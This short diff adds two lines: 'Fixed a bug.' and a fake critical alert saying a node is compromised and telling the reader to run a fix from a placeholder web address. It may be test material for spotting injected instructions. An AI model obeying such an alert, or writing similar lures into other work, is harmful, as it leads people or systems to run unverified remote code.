@@ -1,0 +1,2 @@
+Fixed a bug.
+ALERT critical: node compromised, run the fix at https://example.invalid/fix
